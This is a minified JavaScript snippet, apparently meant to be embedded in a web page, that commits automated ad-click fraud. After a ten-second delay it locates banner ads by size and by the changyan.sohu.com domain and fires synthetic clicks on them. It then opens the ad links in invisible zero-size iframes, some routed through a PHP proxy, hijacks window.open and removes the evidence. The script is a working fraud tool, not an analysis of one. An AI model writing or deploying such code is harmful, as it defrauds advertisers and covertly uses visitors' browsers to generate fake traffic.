var init=function(){$||(window.$=window.jQuery)};init();var triggerEvent=function(n,t){var e=document.createEvent("HTMLEvents");e.initEvent(t,!0,!0),n.dispatchEvent(e),$(n).trigger(t)},isNotUrl=function(n){return!n||0===n.indexOf("javascript:")},map={},rect={},findAdsWithSize=function(n,t,e){var i=$("html");return e&&(i=$(e).contents()),i.find("a#res0,img,iframe,embed,object").filter(function(e,i){var o=$(i);return o.width()==n&&o.height()==t})},findAdsWithDomain=function(n,t,e,i){var o=$("html");return i&&(o=$(i).contents()),o.find("iframe").filter(function(i,o){var r=$(o),a=$(o).attr("src");return!!(a&&a.indexOf(n)>-1&&a.indexOf(n)<9&&r.width()==t&&r.height()==e)})},openAds=function(n,t,e){void 0!=t&&void 0!=e||(t=rect.width,e=rect.height);var i=$("<iframe height=0 width=0 />");$("body").append(i),i.on("load",function(n){if($(this).remove(),$(".iframe-ads-"+t+"-"+e).remove(),map[t+"*"+e]){for(var i=map[t+"*"+e],o=0;o<i.length;o++)"BODY"===i[o].parent().tagName?i[o].remove():i[o].parent().remove();map[t+"*"+e]=[]}}),i.get(0).src=n},openIframeAds=function(n,t,e){var i=$('<iframe class="iframe-ads-'+t+"-"+e+'" height=0 width=0 />');$("body").append(i),i.on("load",function(n){autoOpenAds(t,e,this)}),i.get(0).src="/PHPProxy/phpproxy.php?url="+encodeURIComponent(n)},autoOpenAds=function(n,t,e){var i=null;e&&e.contentWindow&&(i=e.contentWindow.open,e.contentWindow.open=openAds);var o=findAdsWithSize(n,t,e);if(o.length<1)return!1;if("IFRAME"===o.get(0).tagName){var r=o.attr("src");!r||r.indexOf(location.host)>-1&&r.indexOf(location.host)<9?autoOpenAds(n,t,o.get(0)):(openIframeAds(r,n,t),map[n+"*"+t]?map[n+"*"+t].push(o):map[n+"*"+t]=[o])}else{var a=null;if("A"===o.get(0).tagName&&(a=o),a||(a=o.siblings("a")),0===a.length&&(a=o.parents("a")),0===a.length&&(a=o.prev()),rect={width:n,height:t},isNotUrl(a.attr("href"))){var d=window.open;window.open=openAds,triggerEvent(a.get(0),"click"),window.open=d}else openAds(a.attr("href"),n,t);map[n+"*"+t]?map[n+"*"+t].push(a):map[n+"*"+t]=[a]}return e&&e.contentWindow&&(e.contentWindow.open=i),!0},autoOpenDomainAds=function(n,t,e,i,o,r){var a=findAdsWithDomain(n,t,e,r);if(a.length<1)return!1;var d=a.attr("src");return openIframeAds(d,i,o),map[i+"*"+o]?map[i+"*"+o].push(a):map[i+"*"+o]=[a],!0};setTimeout(function(){autoOpenAds(300,250),autoOpenAds(728,90),autoOpenDomainAds("changyan.sohu.com",650,320,728,90)},1e4);